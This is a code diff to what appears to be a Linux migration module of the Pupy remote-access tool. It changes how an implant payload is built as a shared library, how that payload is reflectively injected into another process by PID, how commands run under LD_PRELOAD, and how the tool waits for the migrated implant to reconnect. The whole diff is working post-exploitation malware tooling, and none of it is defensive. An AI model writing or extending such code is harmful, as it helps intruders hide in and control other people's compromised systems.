@@ -1,6 +1,8 @@
 import pupygen
 import time
 import gzip, cStringIO
+import random
+import string
 
 def has_proc_migrated(client, pid):
     for c in client.pupsrv.clients:
@@ -18,12 +20,10 @@ def has_proc_migrated(client, pid):
     return None
 
 def get_payload(module, compressed=True):
-    if module.client.is_proc_arch_64_bits():
-        module.info('Generate pupyx64.so payload')
-        dllbuf = pupygen.get_edit_pupyx64_so(module.client.get_conf())
-    else:
-        module.info('Generate pupyx86.so payload')
-        dllbuf = pupygen.get_edit_pupyx86_so(module.client.get_conf())
+    dllbuf, _, _ = pupygen.generate_binary_from_template(
+        module.client.get_conf(), 'linux',
+        arch=module.client.arch, shared=True
+    )
 
     if not compressed:
         return dllbuf
@@ -37,17 +37,18 @@ def get_payload(module, compressed=True):
 
 def wait_connect(module, pid):
     module.success("waiting for a connection from the DLL ...")
-    while True:
-        c=has_proc_migrated(module.client, pid)
+    for x in xrange(10):
+        c = has_proc_migrated(module.client, pid)
         if c:
             module.success("got a connection from migrated DLL !")
-            c.desc["id"]=module.client.desc["id"]
+            c.desc["id"] = module.client.desc["id"]
+            try:
+                module.client.conn.exit()
+            except Exception:
+                pass
+
             break
-        time.sleep(0.1)
-    try:
-        module.client.conn.exit()
-    except Exception:
-        pass
+        time.sleep(1)
 
 def ld_preload(module, command, wait_thread=False, keep=False):
     payload = get_payload(module)
@@ -69,7 +70,7 @@ def migrate(module, pid, keep=False):
     payload = get_payload(module)
 
     r = module.client.conn.modules['pupy'].reflective_inject_dll(
-        pid, payload, 0
+        pid, payload
     )
 
     if r:
